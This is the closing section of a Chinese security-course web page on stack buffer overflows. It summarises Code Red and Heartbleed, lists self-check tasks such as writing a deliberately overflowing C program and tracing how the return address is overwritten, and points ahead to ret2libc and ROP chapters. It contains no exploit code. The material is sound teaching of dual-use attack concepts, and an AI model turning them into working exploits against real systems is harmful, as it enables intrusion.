+<h3 id="12001-code-red">案例 1：2001 年 Code Red 蠕虫<a class="headerlink" href="#12001-code-red" title="Permanent link">&para;</a></h3>
+<p>微软 IIS 服务器的 <code>idq.dll</code> 中有一个缓冲区溢出漏洞。攻击者发送超长的 URL（远超缓冲区大小）→ 覆盖返回地址 → 跳转到 shellcode → 服务器被远程控制。</p>
+<p><strong>涉及的本草知识点：</strong> §4 栈结构、§5 危险函数（strcpy）、§2 指针覆盖返回地址。</p>
+<h3 id="22014-heartbleed">案例 2：2014 年 Heartbleed（心脏滴血）<a class="headerlink" href="#22014-heartbleed" title="Permanent link">&para;</a></h3>
+<p>这不是栈溢出，而是<strong>越界读取</strong>。OpenSSL 的 heartbeat 功能允许客户端问服务器"我给你发了 X 个字节，你回给我"。但如果客户端说"我给你发了 65535 个字节"（实际上只发了 1 个字节），服务器会从内存里多读 65534 个字节返回——这些字节里可能包含私钥、密码。</p>
+<p><strong>涉及的本草知识点：</strong> §1 内存模型（程序可以读任意地址）、§3 数组越界不检查。</p>
+<h3 id="3-app">案例 3：你手机上的每个 App<a class="headerlink" href="#3-app" title="Permanent link">&para;</a></h3>
+<p>你在手机上用的微信、支付宝、抖音——它们的底层都有 C/C++ 代码。这些代码里如果有栈溢出漏洞，攻击者可以通过发送精心构造的数据（比如一个特殊的表情包、一段特殊的语音消息）来远程控制你的手机。这就是为什么手机操作系统一直在更新补丁。</p>
+<hr />
+<h2 id="_34">📝 复习自检<a class="headerlink" href="#_34" title="Permanent link">&para;</a></h2>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能画出一张完整的内存布局图，标出：高地址、低地址、栈的填充方向（高→低）、数组的填充方向（低→高）、返回地址的位置、RBP 的位置、局部变量的位置</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能解释为什么往 buf[16] 写 100 字节会覆盖返回地址（一步一步说清楚第 17 字节去哪、第 25 字节去哪、第 73 字节去哪）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能写出一个故意栈溢出的 C 程序，并能跑出段错误</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能列出 5 个危险函数，说出每个为什么危险，以及安全替代方案</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能在 GDB 里打一个断点、单步执行、查看寄存器和内存</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能解释：如果程序里用了 <code>strncpy(buf, src, strlen(src))</code>，实际安全吗？（不安全！n 应该反映 dst 的大小，不是 src 的大小）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 能说出至少一个真实世界的缓冲区溢出漏洞案例</li>
+</ul>
+<hr />
+<h2 id="_35">🎬 推荐视频<a class="headerlink" href="#_35" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>视频</th>
+<th>平台</th>
+<th style="text-align: center;">时长</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.bilibili.com/video/BV1c1421k7kY/">C语言灵魂·指针公式化教学</a></td>
+<td>B站</td>
+<td style="text-align: center;">26min</td>
+<td>⭐ 10.2万播放，用公式化方法讲透指针</td>
+</tr>
+<tr>
+<td><a href="https://www.bilibili.com/video/BV19Z421E7Qn/">Log2Base2·C语言指针动画教程</a></td>
+<td>B站</td>
+<td style="text-align: center;">28集</td>
+<td>动画可视化内存模型，每集3-7分钟</td>
+</tr>
+<tr>
+<td><a href="https://www.bilibili.com/video/BV1Gy411h76H/">字节大佬·C语言动画片</a></td>
+<td>B站</td>
+<td style="text-align: center;">系列</td>
+<td>2024年动画讲解，第27课起讲内存</td>
+</tr>
+<tr>
+<td><a href="https://www.bilibili.com/video/BV1JPpuerEUT/">职坐标·3小时搞懂C语言指针</a></td>
+<td>B站</td>
+<td style="text-align: center;">3h</td>
+<td>零基础专攻指针</td>
+</tr>
+<tr>
+<td><a href="https://www.bilibili.com/">gdb调试入门到精通</a></td>
+<td>B站</td>
+<td style="text-align: center;">系列</td>
+<td>搜索"gdb 调试 入门"</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>💡 <strong>推荐观看顺序：</strong> 公式化教学(26min) → 动画教程(看前 5 集) → 回来看本文 §4 栈帧结构 → 动手做 §7 综合实验 → 遇到不懂的回看本文对应小节</p>
+</blockquote>
+<hr />
+<h2 id="_36">🔗 知识串联<a class="headerlink" href="#_36" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>本章学的&quot;栈帧结构&quot;和&quot;返回地址&quot; 
+<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>    → 《03-计算机体系》会展开讲汇编指令（call/ret 到底做了什么）
+<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>    → 《07-二进制安全》会利用这个结构构造真实的攻击（ret2win、ret2libc、ROP）
+<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>
+<a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>本章学的&quot;危险函数&quot;
+<a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>    → 《06-Web安全》中 SQL 注入和命令注入的思路一脉相承——输入没有被控制在预期范围内
+<a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>
+<a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>本章学的 GDB 调试
+<a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>    → 《03》看汇编级别的栈帧变化
+<a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>    → 《07》调试漏洞程序和攻击脚本
+</code></pre></div>
+<hr />
+<blockquote>
+<p>💬 <strong>读完用一句话记下来：</strong> "栈帧里，局部变量 buf 和返回地址是邻居。buf 往高地址溢出，必然会经过返回地址。程序听返回地址的话去执行——如果能控制返回地址，就控制了整个程序的命运。"</p>
+</blockquote>
+<h3 id="02-python-md">下一步：打开 <code>02-Python-安全工具速通.md</code><a class="headerlink" href="#02-python-md" title="Permanent link">&para;</a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["navigation.instant", "navigation.tracking", "navigation.top", "navigation.indexes", "search.suggest", "search.highlight", "search.share", "content.code.copy"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
